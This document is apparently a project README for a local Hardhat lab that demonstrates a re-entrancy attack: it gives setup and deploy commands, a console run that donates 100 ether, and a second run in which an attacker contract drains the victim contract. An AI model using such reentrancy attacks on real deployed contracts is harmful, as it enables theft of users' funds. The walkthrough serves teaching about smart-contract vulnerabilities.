 # BadSmartContract
 
 ## Install hardhat
 ```sh
 npm i
 ```
 
 ## Starting hardhat localhost
 ```sh
 npx hardhat node
 #Started HTTP and WebSocket JSON-RPC server at http://127.0.0.1:8545/
 #
 #Accounts
 #========
 #
 #WARNING: These accounts, and their private keys, are publicly known.
 #Any funds sent to them on Mainnet or any other live network WILL BE LOST.
 #
 #Account #0: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 (10000 ETH)
 #Private Key: 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
 #...
 ```
 ## Compile and Deploy to localhost
 Contracts are deployed using the first signer/account by default.
 ```sh
 npm run compdep
 ...
 #EtherStore_03 deployed to 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707
 #Attacker_03 deployed to 0x0165878A594ca255338adfa4d48449f69242Eb8F
 ```
 Updating Contract address in scripts/reentracyAttack.js
 ### Donate to victim
 ```sh
 npx hardhat run --network localhost scripts/reentracyAttack.js
 ```
 ```sh
 === Simple Re-Entrancy Attack Example ===
      ----------------------------------
      Block Number: 0x2
 
      Current Balances on Blockchain..
      etherstore_owner: 9999.999415166906565725
      attacker_owner: 10000.0
      someOne: 10000.0
 
      EtherStore(Contract) Balance: 0.0
      Balances..
      - Credit of etherstore_owner: 0.0
      - Credit of attacker_owner: 0.0
      - Credit of Attacker(Contract): 0.0
 
      Attacker(Contract) Balance: 0.0
 
 (d)onate 100 Ether to EtherStore, (a)ttack from Attacker Contract(d/a): d
 donating 100 Ether to victim on EtherStore
 
      ----------------------------------
      Block Number: 0x2
 
      Current Balances on Blockchain..
      etherstore_owner: 9999.999415166906565725
      attacker_owner: 10000.0
      someOne: 10000.0
 
      EtherStore(Contract) Balance: 100.0
      Balances..
      - Credit of etherstore_owner: 100.0
      - Credit of attacker_owner: 0.0
      - Credit of Attacker(Contract): 0.0
 
      Attacker(Contract) Balance: 0.0
 ```
 ### Attack to victim
 ```sh
 npx hardhat run --network localhost scripts/reentracyAttack.js
 ```
 ```sh
 ...
 
 (d)onate 100 Ether to EtherStore, (a)ttack from Attacker Contract(d/a): a
 
 #Call attack() on EtherStore ("etherStore.deposit{value: 1 ether}()" and "etherStore.withdraw")
 
      ----------------------------------
      Block Number: 0x3
 
      Current Balances on Blockchain..
      etherstore_owner: 9899.9993857236161347
      attacker_owner: 10000.0
      someOne: 10000.0
 
      EtherStore(Contract) Balance: 0.0
      Balances..
      - Credit of etherstore_owner: 100.0
      - Credit of attacker_owner: 0.0
      - Credit of Attacker(Contract): 0.0
 
      Attacker(Contract) Balance: 101.0
 ```
 
 ## Reset network status
 ```sh
 # Connecting a wallet or Dapp to Hardhat local Network
 npx hardhat console --network localhost
 ```
 ```js
 > await ethers.provider.send('hardhat_reset', [])
 ```